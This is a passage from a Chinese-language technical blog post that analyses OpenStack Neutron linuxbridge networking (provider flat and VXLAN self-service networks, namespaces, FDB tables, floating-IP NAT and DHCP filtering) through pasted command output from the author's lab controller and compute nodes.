forever preferred_lft forever    inet6 fe80::d061:3cff:fedd:3f85/64 scope link       valid_lft forever preferred_lft forever[root@controller ~]# ip netnsqdhcp-dd604587-3542-409b-9ca8-eed06840fb55 (id: 2)[root@controller ~]# ip netns exec qdhcp-dd604587-3542-409b-9ca8-eed06840fb55 ip a...2: ns-a98eeb82-7a@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000    link/ether fa:16:3e:53:6f:70 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 10.0.0.200/24 brd 10.0.0.255 scope global ns-a98eeb82-7a       valid_lft forever preferred_lft forever    inet 169.254.169.254/16 brd 169.254.255.255 scope global ns-a98eeb82-7a       valid_lft forever preferred_lft forever    inet6 fe80::f816:3eff:fe53:6f70/64 scope link       valid_lft forever preferred_lft forever\n在对应实例的计算节点网络是这样的\n[root@compute1 ~]# ip link......2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff[root@compute1 ~]# brctl showbridge name     bridge id               STP enabled     interfacesbrqdd604587-35          8000.000c29a8d7e0       no              ens33[root@compute1 ~]# ip a......2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff    inet6 fe80::ad6b:bdb0:9b14:c54d/64 scope link tentative noprefixroute dadfailed       valid_lft forever preferred_lft forever    inet6 fe80::5597:3a9:a4bd:ae3a/64 scope link noprefixroute       valid_lft forever preferred_lft forever6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff    inet 10.0.0.31/24 brd 10.0.0.255 scope global brqdd604587-35       valid_lft forever preferred_lft forever\n可以看到网络的iddd604587-3542-409b-9ca8-eed06840fb55会在网络控制节点和实例对应计算节点上创建一个网卡，并且取id的前10位作为网卡的名字，即brqdd604587-35，然后就是网络中的端口，可以参考上面网络端口的图片，上面有一个network:dhcp的端口，我感觉这个可以理解为在这个网络上的设备，这个dhcp的端口的名字为a98eeb82-7abe，可以对为网络控制节点中的netns(网络命名空间)，里面的一个设备ns-a98eeb82-7a@if8命名格式也是前10位，可以知道这个接口是当前网络中的DHCP服务，其中这个设备通过link-netnsid和@if8的标识可以判断出他是一个虚拟接口(veth pair对)，通过@if8可以看出他是从主机的tapa98eeb82-7a网卡接出来的，tapa98eeb82-7a是网桥brqdd604587-35中的接口。然后当前两台机器的网桥brctl show中可以看到brqdd604587-35都是ens33的网桥。当前它们的网络架构如下当实例开机，他们的网络情况会变会变成下面这样，网络控制节情况如下\n[root@controller ~]# ip link......2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff8: tapa98eeb82-7a@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP mode DEFAULT group default qlen 1000    link/ether 0a:04:25:5a:e2:67 brd ff:ff:ff:ff:ff:ff link-netnsid 29: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff[root@controller ~]# brctl showbridge name     bridge id               STP enabled     interfacesbrqdd604587-35          8000.000c2908b59e       no              ens33                                                        tapa98eeb82-7a[root@controller ~]# ip a......8: tapa98eeb82-7a@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP group default qlen 1000    link/ether 0a:04:25:5a:e2:67 brd ff:ff:ff:ff:ff:ff link-netnsid 29: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff    inet 10.0.0.11/24 brd 10.0.0.255 scope global brqdd604587-35       valid_lft forever preferred_lft forever    inet6 fe80::d061:3cff:fedd:3f85/64 scope link       valid_lft forever preferred_lft forever[root@controller ~]# ip netnsqdhcp-dd604587-3542-409b-9ca8-eed06840fb55 (id: 2)[root@controller ~]# ip netns exec qdhcp-dd604587-3542-409b-9ca8-eed06840fb55 ip a......2: ns-a98eeb82-7a@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000    link/ether fa:16:3e:53:6f:70 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 10.0.0.200/24 brd 10.0.0.255 scope global ns-a98eeb82-7a       valid_lft forever preferred_lft forever    inet 169.254.169.254/16 brd 169.254.255.255 scope global ns-a98eeb82-7a       valid_lft forever preferred_lft forever    inet6 fe80::f816:3eff:fe53:6f70/64 scope link       valid_lft forever preferred_lft forever\n在对应实例的计算节点中他的网络变成了这样\n[root@compute1 ~]# ip link......2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff8: tap76c0c08c-79: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UNKNOWN mode DEFAULT group default qlen 1000    link/ether fe:16:3e:4d:6a:b1 brd ff:ff:ff:ff:ff:ff[root@compute1 ~]# brctl showbridge name     bridge id               STP enabled     interfacesbrqdd604587-35          8000.000c29a8d7e0       no              ens33                                                        tap76c0c08c-79[root@compute1 ~]# ip a......6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff    inet 10.0.0.31/24 brd 10.0.0.255 scope global brqdd604587-35       valid_lft forever preferred_lft forever8: tap76c0c08c-79: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UNKNOWN group default qlen 1000    link/ether fe:16:3e:4d:6a:b1 brd ff:ff:ff:ff:ff:ff    inet6 fe80::fc16:3eff:fe4d:6ab1/64 scope link       valid_lft forever preferred_lft forever\n改变主要是在计算节点，在计算节点中他的网桥关联了一个新的接口tap76c0c08c-79,这个接口是怎么来的呢，可以参考虚机的配置\n[root@compute1 ~]# virsh list Id    Name                           State---------------------------------------------------- 3     instance-00000010              running[root@compute1 ~]# cd /etc/libvirt/qemu/[root@compute1 qemu]# lsinstance-00000010.xml  networks\n在instance-00000010.xml中，网络接口相关配置如下\n&lt;interface type=&#x27;bridge&#x27;&gt;  &lt;mac address=&#x27;fa:16:3e:4d:6a:b1&#x27;&gt;&lt;/mac&gt;  &lt;source bridge=&#x27;brqdd604587-35&#x27;&gt;&lt;/source&gt;  &lt;target dev=&#x27;tap76c0c08c-79&#x27;&gt;&lt;/target&gt;  &lt;model type=&#x27;virtio&#x27;&gt;&lt;/model&gt;  &lt;mtu size=&#x27;1500&#x27;&gt;&lt;/mtu&gt;  &lt;address type=&#x27;pci&#x27; domain=&#x27;0x0000&#x27; bus=&#x27;0x00&#x27; slot=&#x27;0x03&#x27; function=&#x27;0x0&#x27;&gt;&lt;/address&gt;&lt;/interface&gt;\n它基于brqdd604587-35做了一个桥接的虚拟接口到tap76c0c08c-79提供给虚机用。现在的网络架构如下从组件理解中可以知道，当前的这个供应商网络provider在实际通信中只是做了一层网络映射，映射到实际网络中，我们这里其实可以理解为虚机是直连在这个外部交换机上的，出现问题可以参考一下思考总结里的实验。\n自助式-Vxlan网络Self-service networks的VXLAN网络，网络拓扑拓扑如下网络相关配置如下开启主机去看网络信息，在控制节点的网络信息如下\n[root@controller ~]# ip link2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff4: ens37: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:08:b5:b2 brd ff:ff:ff:ff:ff:ff7: tap7cb3b509-23@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UP mode DEFAULT group default qlen 1000    link/ether 9a:4f:c8:45:64:e7 brd ff:ff:ff:ff:ff:ff link-netnsid 18: vxlan-1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UNKNOWN mode DEFAULTgroup default qlen 1000    link/ether 0a:b6:1f:77:c4:1b brd ff:ff:ff:ff:ff:ff9: brq7f850748-2d: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP mode DEFAULT group default qlen 1000    link/ether 0a:b6:1f:77:c4:1b brd ff:ff:ff:ff:ff:ff10: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff14: tapf00694f6-24@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP mode DEFAULT group default qlen 1000    link/ether 5a:b6:d1:fe:08:64 brd ff:ff:ff:ff:ff:ff link-netnsid 015: tap31b0feaa-20@if3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UP mode DEFAULT group default qlen 1000    link/ether 3e:f5:9d:44:57:29 brd ff:ff:ff:ff:ff:ff link-netnsid 0[root@controller ~]# ip a2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP group default qlen 1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff    inet6 fe80::ad6b:bdb0:9b14:c54d/64 scope link noprefixroute       valid_lft forever preferred_lft forever4: ens37: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:08:b5:b2 brd ff:ff:ff:ff:ff:ff    inet 172.16.0.11/24 brd 172.16.0.255 scope global noprefixroute ens37       valid_lft forever preferred_lft forever    inet6 fe80::20c:29ff:fe08:b5b2/64 scope link       valid_lft forever preferred_lft forever7: tap7cb3b509-23@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UP group default qlen 1000    link/ether 9a:4f:c8:45:64:e7 brd ff:ff:ff:ff:ff:ff link-netnsid 18: vxlan-1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UNKNOWN group default qlen 1000    link/ether 0a:b6:1f:77:c4:1b brd ff:ff:ff:ff:ff:ff9: brq7f850748-2d: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000    link/ether 0a:b6:1f:77:c4:1b brd ff:ff:ff:ff:ff:ff    inet6 fe80::44b9:8bff:feee:1639/64 scope link       valid_lft forever preferred_lft forever10: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000    link/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff    inet 10.0.0.11/24 brd 10.0.0.255 scope global brqdd604587-35       valid_lft forever preferred_lft forever    inet6 fe80::2073:d5ff:fedc:5d7/64 scope link       valid_lft forever preferred_lft forever14: tapf00694f6-24@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP groupdefault qlen 1000    link/ether 5a:b6:d1:fe:08:64 brd ff:ff:ff:ff:ff:ff link-netnsid 015: tap31b0feaa-20@if3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UP groupdefault qlen 1000    link/ether 3e:f5:9d:44:57:29 brd ff:ff:ff:ff:ff:ff link-netnsid 0[root@controller ~]# ip netnsqrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 (id: 0)qdhcp-7f850748-2d01-4f88-95fa-41b6144b1c02 (id: 1)[root@controller ~]# ip netns exec qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 ip a2: qg-f00694f6-24@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000    link/ether fa:16:3e:6a:e4:80 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 10.0.0.208/24 brd 10.0.0.255 scope global qg-f00694f6-24       valid_lft forever preferred_lft forever    inet6 fe80::f816:3eff:fe6a:e480/64 scope link       valid_lft forever preferred_lft forever3: qr-31b0feaa-20@if15: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000    link/ether fa:16:3e:3d:18:d0 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 10.10.10.1/24 brd 10.10.10.255 scope global qr-31b0feaa-20       valid_lft forever preferred_lft forever    inet6 fe80::f816:3eff:fe3d:18d0/64 scope link       valid_lft forever preferred_lft forever[root@controller ~]# ip netns exec qdhcp-7f850748-2d01-4f88-95fa-41b6144b1c02 ip a2: ns-7cb3b509-23@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000    link/ether fa:16:3e:85:9c:4c brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 10.10.10.100/24 brd 10.10.10.255 scope global ns-7cb3b509-23       valid_lft forever preferred_lft forever    inet 169.254.169.254/16 brd 169.254.255.255 scope global ns-7cb3b509-23       valid_lft forever preferred_lft forever    inet6 fe80::f816:3eff:fe85:9c4c/64 scope link       valid_lft forever preferred_lft forever[root@controller ~]# brctl showbridge name     bridge id               STP enabled     interfacesbrq7f850748-2d          8000.0ab61f77c41b       no              tap31b0feaa-20                                                        tap7cb3b509-23                                                        vxlan-1brqdd604587-35          8000.000c2908b59e       no              ens33                                                        tapf00694f6-24\n由于内容较多，这里就先把控制节点的结构分析一下先看网桥，他有两个网桥，它与子网的ID是对的上号的，具体可以看看上面的截图，vxlan子网id为7f850748-2d01-4f88-95fa-41b6144b1c02这里的网桥名字就是brq7f850748-2dbrq+子网id的前10位，然后我们先看一下brqdd604587-35，这个网络是外部provider网络，他是ens33的网桥，他有一个接口tapf00694f6-24，我们再看一下这个接口，发现在qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3命名空间中一个连接的接口qg-f00694f6-24@if14他的ip是10.0.0.208这里估计是一个出网的IP，他是在provider子网端口中也有记录，具体可以去集群中查看，然后再看一下vxlan-1的网桥brq7f850748-2d，上面除了vxlan-1的接口，还有两个虚拟接口分别是tap31b0feaa-20和tap7cb3b509-23，它们的对端可以在命名空间中找到，tap31b0feaa-20对端在qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3命名空间中，对应的接口名字是qr-31b0feaa-20，他的ip是10.10.10.1，这个ip可以得知是在当前子网的网关，在集群中可以得知的ip，这个命名空间中还有一个接口，它的对端刚好是provider网络的网桥中的接口，我们继续看vxlan-1网络的的个虚拟接口tap7cb3b509-23,他的对端是qdhcp-7f850748-2d01-4f88-95fa-41b6144b1c02命名空间中的ns-7cb3b509-23接口用作DHCP。计算节点的网络信息如下\n[root@compute1 ~]# ip link2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff4: ens37: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:a8:d7:f4 brd ff:ff:ff:ff:ff:ff6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff7: brq7f850748-2d: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP mode DEFAULT group default qlen 1000    link/ether 6e:e5:c4:4f:34:c9 brd ff:ff:ff:ff:ff:ff8: tap26500e0a-b5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc pfifo_fast master brq7f850748-2d state UNKNOWN mode DEFAULT group default qlen 1000    link/ether fe:16:3e:68:60:74 brd ff:ff:ff:ff:ff:ff10: vxlan-1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UNKNOWN mode DEFAULT group default qlen 1000    link/ether 6e:e5:c4:4f:34:c9 brd ff:ff:ff:ff:ff:ff[root@compute1 ~]# ip a2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff    inet6 fe80::ad6b:bdb0:9b14:c54d/64 scope link tentative noprefixroute dadfailed       valid_lft forever preferred_lft forever    inet6 fe80::5597:3a9:a4bd:ae3a/64 scope link tentative noprefixroute dadfailed       valid_lft forever preferred_lft forever    inet6 fe80::6f88:d473:e534:aaf9/64 scope link tentative noprefixroute dadfailed       valid_lft forever preferred_lft forever4: ens37: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:a8:d7:f4 brd ff:ff:ff:ff:ff:ff    inet 172.16.0.31/24 brd 172.16.0.255 scope global noprefixroute ens37       valid_lft forever preferred_lft forever    inet6 fe80::20c:29ff:fea8:d7f4/64 scope link       valid_lft forever preferred_lft forever6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000    link/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff    inet 10.0.0.31/24 brd 10.0.0.255 scope global brqdd604587-35       valid_lft forever preferred_lft forever7: brq7f850748-2d: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000    link/ether 6e:e5:c4:4f:34:c9 brd ff:ff:ff:ff:ff:ff8: tap26500e0a-b5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc pfifo_fast master brq7f850748-2d state UNKNOWN group default qlen 1000    link/ether fe:16:3e:68:60:74 brd ff:ff:ff:ff:ff:ff    inet6 fe80::fc16:3eff:fe68:6074/64 scope link       valid_lft forever preferred_lft forever10: vxlan-1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UNKNOWN group default qlen 1000    link/ether 6e:e5:c4:4f:34:c9 brd ff:ff:ff:ff:ff:ff[root@compute1 ~]# brctl showbridge name     bridge id               STP enabled     interfacesbrq7f850748-2d          8000.6ee5c44f34c9       no              tap26500e0a-b5                                                        vxlan-1brqdd604587-35          8000.000c29a8d7e0       no              ens33\n先看一下网桥，brqdd604587-35是provider网络的一个网桥，这里不多讲，在这个节点并没有使用到他，看一下另外一个网桥brq7f850748-2d，它是vxlan-1设备的网桥，另一个接口tap26500e0a-b5连接在实例中。分析完上面的网络，这里再讲一下vxlan-1这个设备，他是Neutron负责管理的，就以现在的网络拓扑为例，他如果要出外网就需要去找10.10.10.1这个网关，他在控制节点上，他是如何找到它的？而且当前的网络信息，没有设备连接到ens37上，参考上面的引用，再搭建的过程中，这个网络是用来做vxlan的接口，他为啥是一个单独的接口没有任何的关联？这里就要说到vxlan了它们的通信是采用vxlan的方式，当前的拓扑vxlan-1是集群子网brq7f850748-2d网桥的最外层，网桥是桥接的它，在配置他的过程中还有一段配置如下\n[vxlan]enable_vxlan = truelocal_ip = 172.16.0.31l2_population = true\n这是在计算节点的配置，这个local_ip是用来封装vxlan的，它定义了vxlan具体使用的网卡，这个ip必须是当前主机的一个ip，而且必须要和对端vxlan设备相通，具体的跨节点数据包发过来之后，他会在数据包的基础上，封装一层，原地址就写这个local_ip，对端的ip则会写FDB表对应的IP，这个对应表是通过L2 Population去发现，也有其他实现的方法(组播形式)，配置体现也在上面(vxlan配置)，通过命令bridge fdb show dev vxlan-1可以拿到学习到的FDB表，控制节点的内容如下\n[root@controller ~]# bridge fdb show dev vxlan-10a:b6:1f:77:c4:1b vlan 1 master brq7f850748-2d permanent0a:b6:1f:77:c4:1b master brq7f850748-2d permanent00:00:00:00:00:00 dst 172.16.0.31 self permanentfa:16:3e:68:60:74 dst 172.16.0.31 self permanent\n计算节点的内容如下\n[root@compute1 ~]# bridge fdb show dev vxlan-16e:e5:c4:4f:34:c9 vlan 1 master brq7f850748-2d permanent6e:e5:c4:4f:34:c9 master brq7f850748-2d permanent00:00:00:00:00:00 dst 172.16.0.11 self permanentfa:16:3e:85:9c:4c dst 172.16.0.11 self permanentfa:16:3e:3d:18:d0 dst 172.16.0.11 self permanent\n这里的FDB表内容是，对方mac地址+vxlan设备地址，这些mac具体对应的ip可以在对应的对端网络通过查看arp表获取，例如在控制节点的对应网络中，即qdhcp-7f850748-2d01-4f88-95fa-41b6144b1c02命名空间中的arp表如下\n[root@controller ~]# ip netns exec qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 ip a......3: qr-31b0feaa-20@if15: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000    link/ether fa:16:3e:3d:18:d0 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 10.10.10.1/24 brd 10.10.10.255 scope global qr-31b0feaa-20       valid_lft forever preferred_lft forever    inet6 fe80::f816:3eff:fe3d:18d0/64 scope link       valid_lft forever preferred_lft forever[root@controller ~]# ip netns exec qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 arpAddress                  HWtype  HWaddress           Flags Mask            Iface10.10.10.133             ether   fa:16:3e:68:60:74   C                     qr-31b0feaa-20gateway                  ether   00:50:56:ea:8e:2f   C                     qg-f00694f6-24\n在实例中的对应表如下控制节点的ip即当前vxlan网络的网关10.10.10.1mac地址是fa:16:3e:3d:18:d0，实例的ip是10.10.10.133mac地址是fa:16:3e:68:60:74，在对方节点学习到的arp也是如此，当发包的时候这些信息也都会存储在数据包中(不仅仅是当前网络所有的网络都是这样的具体参考计算机网络学科)，vxlan设备会拿到这些信息去查询FDB表，例如在计算点fa:16:3e:3d:18:d0这个mac地址对应的ip是172.16.0.11那么vxlan设备就会在这个数据包的基础上套一层源地址、目的地址、VNI标识等其他信息，这里不细说封装，源地址即linuxbridge_agent配置中的local_ip即172.16.0.31，对应的也会从这个地址的网卡发包，目的地址就是刚才查询到的FDB的地址，即172.16.0.11，然后VNI标识是用来区分网络的，因为所有的数据包都去走这个vxlan的udp端口，具体区分网络的方式就是通过这个VNI标识，封装好相关数据之后会发给对端，具体的对端端口可以通过下面命令获取\n[root@controller ~]# ip -d link show vxlan-18: vxlan-1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UNKNOWN mode DEFAULTgroup default qlen 1000    link/ether 0a:b6:1f:77:c4:1b brd ff:ff:ff:ff:ff:ff promiscuity 1    vxlan id 1 dev ens37 srcport 0 0 dstport 8472 ageing 300 noudpcsum noudp6zerocsumtx noudp6zerocsumrx    bridge_slave state forwarding priority 32 cost 100 hairpin off guard off root_block off fastleave off learning onflood on port_id 0x8001 port_no 0x1 designated_port 32769 designated_cost 0 designated_bridge 8000.a:b6:1f:77:c4:1b designated_root 8000.a:b6:1f:77:c4:1b hold_timer    0.00 message_age_timer    0.00 forward_delay_timer    0.00 topology_change_ack 0 config_pending 0 proxy_arp off proxy_arp_wifi off mcast_router 1 mcast_fast_leave off mcast_flood on addrgenmode eui64 numtxqueues 1 numrxqueues 1 gso_max_size 65536 gso_max_segs 65535[root@controller ~]# ss -unl|grep 8472UNCONN     0      0            *:8472                     *:*\n所有有vxlan设备的主机应该都是差不多的，vxlan的标准端口是4789，他这里指定的是8472，这个端口好像是思科的标准，这里的端口是内核负责监听的，所以这里你是不可以通过进程的形式找到他的监听程序的，他拿到数据就会丢到相应的VXLAN设备中这个设备会把这个包的最外层也就是上一个VXLAN设备给封装的相关内容剔除然后进行转发原本的地址，这样就实现了通信。再说一下浮动IP，这里我创建一个浮动IP给当前实例绑定上，如下图绑定之后发现计算节点的网络信息并没有该边而是在计算节在qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3命名空间中的出网接口增加了一个IP，配置如下\n[root@controller ~]# ip netns exec qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 ip a2: qg-f00694f6-24@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000    link/ether fa:16:3e:6a:e4:80 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 10.0.0.208/24 brd 10.0.0.255 scope global qg-f00694f6-24       valid_lft forever preferred_lft forever    inet 10.0.0.210/32 brd 10.0.0.210 scope global qg-f00694f6-24       valid_lft forever preferred_lft forever    inet6 fe80::f816:3eff:fe6a:e480/64 scope link       valid_lft forever preferred_lft forever3: qr-31b0feaa-20@if15: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000    link/ether fa:16:3e:3d:18:d0 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 10.10.10.1/24 brd 10.10.10.255 scope global qr-31b0feaa-20       valid_lft forever preferred_lft forever    inet6 fe80::f816:3eff:fe3d:18d0/64 scope link       valid_lft forever preferred_lft forever\n对应的路由转发相关的规则会在iptables体现，具体参考下面命令\n[root@controller ~]# ip netns exec qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 iptables -t nat -L -n -v|grep 210    0     0 DNAT       all  --  *      *       0.0.0.0/0            10.0.0.210           to:10.10.10.133    0     0 DNAT       all  --  *      *       0.0.0.0/0            10.0.0.210           to:10.10.10.133    0     0 SNAT       all  --  *      *       10.10.10.133         0.0.0.0/0            to:10.0.0.210\n当前网络的结构关系如下图\n思考总结在研究openstack网络Neutron组件的过程中，心里好多疑问，我把它总结到这里，问题以及验证。\n在FLAT网络中内部和外部的DHCP为什么可以做到互不干预？这个问题其实并不严谨，我当时是上面供应商-Provider网络的结构，我外部是采用VMware的NAT网络，我给开了一个内部DHCP，配置如图然而我FLAT的子网中也配置了一个DHCP-Agent,如下图我发现它们两个DHCP互不干预，当子网的DHCP关闭，对应子网内的实例是无法通过外部DHCP获取IP的，然后外部的DHCP关掉，内部的打开，外部的对应网络下的虚机也是无法通过内部DHCP获取到IP的。各种文档解释FLAT网络都是相当于直连，但是为什么当前的的环境下DHCP不互通？而且我内部甚至可以使用外部的网关进行上网？我查了好多文章都没发现有人说这个的，我就进入虚机自己分析了，我最开始怀疑他做了内部隔离，就是两个广播域，他通过软件的方式去做映射，我通过把内部子网DHCP关掉，这样内部的实例就会去播报arp宣告，我发现不管是那台主机去抓包都会拿到他广播的数据包，并且外部的DHCP是回复了他的数据包的，这就很奇怪，如下图首先是第一个红框的内容，实例发送了DHCP广播Discover包，然而10.0.0.254明明给他了一个ip10.0.0.254但是后续就没了，按照正常顺序他应该回复一个DHCP Request的一个确认数据包，但是他这里没后续，并且继续去广播Discover包，而且他依旧回复了，给他了一个10.0.0.161，中途外部的DHCP一直广播ARP谁是这个他分配的这个ip一直也没有得到回复，后续一直再重复这个过程，这里可以判断出它们确实都在一个广播域中，只是客户端一直没去使用外部DHCP，在openstack网络结构中这一层的网桥(我这里叫做第二层网桥)，如图他有一个数据包过滤的作用，这里去计算节点中查看iptables过滤规则，发现了端倪，规则如下\n[root@compute1 ~]# iptables-save | grep -E &#x27;67|68&#x27;:INPUT ACCEPT [127064:177468678]-A neutron-linuxbri-i76c0c08c-7 -d 10.0.0.206/32 -p udp -m udp --sport 67 --dport 68 -j RETURN-A neutron-linuxbri-i76c0c08c-7 -d 255.255.255.255/32 -p udp -m udp --sport 67 --dport 68 -j RETURN-A neutron-linuxbri-o76c0c08c-7 -s 0.0.0.0/32 -d 